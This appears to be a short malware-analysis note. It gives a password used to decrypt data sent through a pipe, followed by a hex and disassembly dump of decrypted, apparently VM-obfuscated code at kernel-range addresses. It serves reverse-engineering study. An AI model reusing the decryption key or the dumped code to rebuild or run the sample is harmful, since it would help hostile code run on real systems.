3531_4ever = password used to decrypt data through pipe.

-----------------------------------------------------------------------------------------------

DECRYPTED first part (VM):

8a232000 e800000000	call    8a232005
8a232c70  45 fc 8b 4c 85 f0 3b 4d-08 75 12 8b 55 fc c1 e2  E..L..;M.u..U...
8a232c80  05 8d 44 15 b0 50 e8 15-00 00 00 eb 04 eb d1 33  ..D..P.........3
8a232c90  c0 8b e5 5d c2 04 00 cc-cc cc cc cc cc cc cc cc  ...]............
8a232ca0  55 8b ec 81 ec 0c 05 00-00 c6 85 7a ff ff ff 50  U..........z...P
8a232cb0  c6 85 7b ff ff ff 04 c6-85 7c ff ff ff 19 c6 85  ..{......|......
8a232cc0  7d ff ff ff 12 c6 85 7e-ff ff ff 49 c6 85 7f ff  }......~...I....
8a232cd0  ff ff 00 c6 45 80 00 c6-45 81 00 c6 45 82 7d c6  ....E...E...E.}.
8a232ce0  45 83 00 c6 45 84 00 c6-45 85 00 c6 45 86 81 c6  E...E...E...E...
8a232cf0  45 87 00 c6 45 88 00 c6-45 89 00 c6 45 8a 00 c6  E...E...E...E...
8a232d00  45 8b 00 c6 45 8c 00 c6-45 8d 00 c6 45 8e 01 c6  E...E...E...E...
8a232d10  45 8f 70 c6 45 90 20 c6-45 91 01 c6 45 92 01 c6  E.p.E. .E...E...
8a232d20  45 93 01 c6 45 94 0a c6-45 95 00 c6 45 96 12 c6  E...E...E...E...
8a232d30  45 97 01 c6 45 98 01 c6-45 99 02 c6 45 9a 01 c6  E...E...E...E...
8a232d40  45 9b 0a c6 45 9c 00 c6-45 9d 12 c6 45 9e 01 c6  E...E...E...E...
8a232d50  45 9f 01 c6 45 a0 03 c6-45 a1 21 c6 45 a2 01 c6  E...E...E.!.E...
8a232d60  45 a3 80 c6 45 a4 20 c6-45 a5 0a c6 45 a6 70 c6  E...E. .E...E.p.
8a232d70  45 a7 18 c6 45 a8 0a c6-45 a9 73 c6 45 aa 18 c6  E...E...E.s.E...
8a232d80  45 ab 01 c6 45 ac 34 c6-45 ad 01 c6 45 ae 0a c6  E...E.4.E...E...
8a232d90  45 af 14 c6 45 b0 08 c6-45 b1 0a c6 45 b2 21 c6  E...E...E...E.!.
8a232da0  45 b3 18 c6 45 b4 01 c6-45 b5 43 c6 45 b6 04 c6  E...E...E.C.E...
8a232db0  45 b7 0a c6 45 b8 03 c6-45 b9 12 c6 45 ba 01 c6  E...E...E...E...
8a232dc0  45 bb 06 c6 45 bc 03 c6-45 bd 28 c6 45 be 07 c6  E...E...E.(.E...
8a232dd0  45 bf 01 c6 45 c0 1d c6-45 c1 00 c6 45 c2 00 c6  E...E...E...E...
8a232de0  45 c3 00 c6 45 c4 00 c6-45 c5 18 c6 45 c6 8b c6  E...E...E...E...
8a232df0  45 c7 1d c6 45 c8 4e c6-45 c9 d2 c6 45 ca 53 c6  E...E.N.E...E.S.
8a232e00  45 cb 84 c6 45 cc 96 c6-45 cd 88 c6 45 ce bd c6  E...E...E...E...
8a232e10  45 cf cc c6 45 d0 dd c6-45 d1 f1 c6 45 d2 04 c6  E...E...E...E...
8a232e20  45 d3 14 c6 45 d4 01 c6-45 d5 39 c6 45 d6 4b c6  E...E...E.9.E.K.
8a232e30  45 d7 5d c6 45 d8 65 c6-45 d9 b0 c6 45 da 9b c6  E.].E.e.E...E...
8a232e40  45 db a4 c6 45 dc a7 c6-45 dd ed c6 45 de d1 c6  E...E...E...E...
8a232e50  45 df fd c6 45 e0 ed c6-45 e1 10 c6 45 e2 29 c6  E...E...E...E.).
8a232e60  45 e3 f6 c6 45 e4 5f c6-45 e5 5e c6 45 e6 6b c6  E...E._.E.^.E.k.
8a232e70  45 e7 7b c6 45 e8 8f c6-45 e9 a1 c6 45 ea b3 c6  E.{.E...E...E...
8a232e80  45 eb c1 c6 45 ec 5d c6-45 ed ea c6 45 ee f9 c6  E...E.].E...E...
8a232e90  45 ef 06 c6 45 f0 1f c6-45 f1 31 c6 45 f2 43 c6  E...E...E.1.E.C.
8a232ea0  45 f3 55 c6 45 f4 67 c6-45 f5 79 c6 45 f6 8b c6  E.U.E.g.E.y.E...
8a232eb0  45 f7 9d c6 45 f8 af c6-45 f9 f6 c6 45 fa 60 c6  E...E...E...E.`.
8a232ec0  45 fb 58 c6 45 fc 0c c7-85 70 ff ff ff 50 00 00  E.X.E....p...P..
8a232ed0  00 c7 85 74 ff ff ff 04-00 00 00 8b 45 08 89 85  ...t........E...
8a232ee0  60 ff ff ff 8b 8d 70 ff-ff ff 89 8d 64 ff ff ff  `.....p.....d...
8a232ef0  8b 95 74 ff ff ff 89 95-68 ff ff ff 8d 8d f4 fa  ..t.....h.......
8a232f00  ff ff e8 89 f5 ff ff 8d-85 60 ff ff ff 50 6a 03  .........`...Pj.
8a232f10  6a 00 8d 8d 7c ff ff ff-51 8d 8d f4 fa ff ff e8  j...|...Q.......
8a232f20  4c f7 ff ff 89 85 6c ff-ff ff 8d 8d f4 fa ff ff  L.....l.........
8a232f30  e8 1b f6 ff ff 8b 85 6c-ff ff ff 8b e5 5d c2 04  .......l.....]..
8a232f40  00 cc cc cc cc cc cc cc-cc cc cc cc cc cc cc cc  ................
8a232f50  55 8b ec 83 ec 08 89 4d-fc 8b 45 fc 8b 88 62 04  U......M..E...b.
8a232f60  00 00 83 e9 04 89 4d f8-8b 55 fc 8b 45 f8 89 82  ......M..U..E...
8a232f70  62 04 00 00 8b 4d f8 8b-55 08 89 11 b8 04 00 00  b....M..U.......
8a232f80  00 6b c8 06 8b 55 fc 8b-45 fc 8b 80 62 04 00 00  .k...U..E...b...
8a232f90  89 84 0a 16 04 00 00 8b-e5 5d c2 04 00 cc cc cc  .........]......
8a232fa0  55 8b ec 83 ec 08 89 4d-fc 8b 45 fc 8b 88 62 04  U......M..E...b.
8a232fb0  00 00 8b 11 89 55 f8 8b-45 fc 8b 88 62 04 00 00  .....U..E...b...
8a232fc0  83 c1 04 8b 55 fc 89 8a-62 04 00 00 b8 04 00 00  ....U...b.......
8a232fd0  00 6b c8 06 8b 55 fc 8b-45 fc 8b 80 62 04 00 00  .k...U..E...b...
